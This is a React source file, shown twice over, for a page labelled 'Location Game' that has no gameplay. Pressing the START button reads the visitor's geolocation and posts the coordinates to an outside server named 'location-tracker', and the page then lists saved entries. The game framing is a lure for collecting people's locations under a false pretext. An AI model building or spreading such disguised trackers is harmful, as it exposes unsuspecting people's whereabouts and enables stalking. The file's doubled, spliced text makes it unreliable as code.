import { useState, useEffect } from "react";

function App() {
  const [status, setStatus] = useState("🎮 Press START to play");
  const [history, setHistory] = useState([]);
  const [loading, setLoading] = useState(false);

  // ✅ LOAD DATA ON PAGE LOAD
  useEffect(() => {
    fetchHistory();
  }, []);

  const fetchHistory = async () => {
    try {
      const res = await fetch("https://location-tracker-km22.onrender.com/locations");
      const data = await res.json();

      console.log("DATA:", data); // 🔥 DEBUG

      setHistory(data);
    } catch (err) {
      console.log("Error fetching:", err);
    }
  };

  const startGame = () => {
    if (!navigator.geolocation) {
      setStatus("❌ Not supported");
      return;
    }

    setLoading(true);
    setStatus("📡 Detecting location...");

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const lat = pos.coords.latitude;
        const lng = pos.coords.longitude;

        try {
          await fetch("https://location-tracker-km22.onrender.com/location", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ lat, lng }),
          });

          setStatus("🏆 Location saved!");

          // ✅ REFRESH DATA
          fetchHistory();

          setLoading(false);

        } catch (err) {
          setStatus("❌ Error sending data");
          setLoading(false);
        }
      },
      () => {
        setStatus("❌ Permission denied");
        setLoading(false);
      }
    );
  };

  return (
    <div style={styles.container}>
      <h1 style={styles.title}>🎮 Location Game</h1>

      <button style={styles.button} onClick={startGame}>
        {loading ? "⏳ Loading..." : "▶ START GAME"}
      </button>

      <p style={styles.status}>{status}</p>

      <div style={styles.history}>
        <h2>📜 History (IST)</h2>

        {history.length === 0 ? (
          <p>No data found ❌</p>
        ) : (
          history.map((item, index) => (
            <div key={index} style={styles.card}>
              🕒 {item.time}
            </div>
          ))
        )}
      </div>
    </div>
  );
}

const styles = {
  container: {
    minHeight: "100vh",
    background: "#0f172a",
    color: "#fff",
    display: "flex",
    flexDirection: "column",
    alignItems: "center",
    paddingTop: "60px",
  },
  title: {
    fontSize: "40px",
  },
  button: {
    marginTop: "20px",
    padding: "15px 30px",
    fontSize: "18px",
    background: "#22c55e",
    border: "none",
    borderRadius: "10px",
    cursor: "pointer",
  },
  status: {
    marginTop: "15px",
  },
  history: {
    marginTop: "30px",
    width: "90%",
    maxWidth: "400px",
  },
  card: {
    background: "#1e293b",
    padding: "10px",
    margin: "10px 0",
    borderRadius: "8px",
  },
};

export default App;import { useState, useEffect } from "react";

function App() {
  const [status, setStatus] = useState("🎮 Press START to play");
  const [history, setHistory] = useState([]);
  const [loading, setLoading] = useState(false);

  // ✅ LOAD DATA ON PAGE LOAD
  useEffect(() => {
    fetchHistory();
  }, []);

  const fetchHistory = async () => {
    try {
      const res = await fetch("https://location-tracker-km22.onrender.com/locations");
      const data = await res.json();

      console.log("DATA:", data); // 🔥 DEBUG

      setHistory(data);
    } catch (err) {
      console.log("Error fetching:", err);
    }
  };

  const startGame = () => {
    if (!navigator.geolocation) {
      setStatus("❌ Not supported");
      return;
    }

    setLoading(true);
    setStatus("📡 Detecting location...");

    navigator.geolocation.getCurrentPosition(
      async (pos) => {
        const lat = pos.coords.latitude;
        const lng = pos.coords.longitude;

        try {
          await fetch("https://location-tracker-km22.onrender.com/location", {
            method: "POST",
            headers: {
              "Content-Type": "application/json",
            },
            body: JSON.stringify({ lat, lng }),
          });

          setStatus("🏆 Location saved!");

          // ✅ REFRESH DATA
          fetchHistory();

          setLoading(false);

        } catch (err) {
          setStatus("❌ Error sending data");
          setLoading(false);
        }
      },
      () => {
        setStatus("❌ Permission denied");
        setLoading(false);
      }
    );
  };

  return (
    <div style={styles.container}>
      <h1 style={styles.title}>🎮 Location Game</h1>

      <button style={styles.button} onClick={startGame}>
        {loading ? "⏳ Loading..." : "▶ START GAME"}
      </button>

      <p style={styles.status}>{status}</p>

      <div style={styles.history}>
        <h2>📜 History (IST)</h2>

        {history.length === 0 ? (
          <p>No data found ❌</p>
        ) : (
          history.map((item, index) => (
            <div key={index} style={styles.card}>
              🕒 {item.time}
            </div>
          ))
        )}
      </div>
    </div>
  );
}

const styles = {
  container: {
    minHeight: "100vh",
    background: "#0f172a",
    color: "#fff",
    display: "flex",
    flexDirection: "column",
    alignItems: "center",
    paddingTop: "60px",
  },
  title: {
    fontSize: "40px",
  },
  button: {
    marginTop: "20px",
    padding: "15px 30px",
    fontSize: "18px",
    background: "#22c55e",
    border: "none",
    borderRadius: "10px",
    cursor: "pointer",
  },
  status: {
    marginTop: "15px",
  },
  history: {
    marginTop: "30px",
    width: "90%",
    maxWidth: "400px",
  },
  card: {
    background: "#1e293b",
    padding: "10px",
    margin: "10px 0",
    borderRadius: "8px",
  },
};

export default App;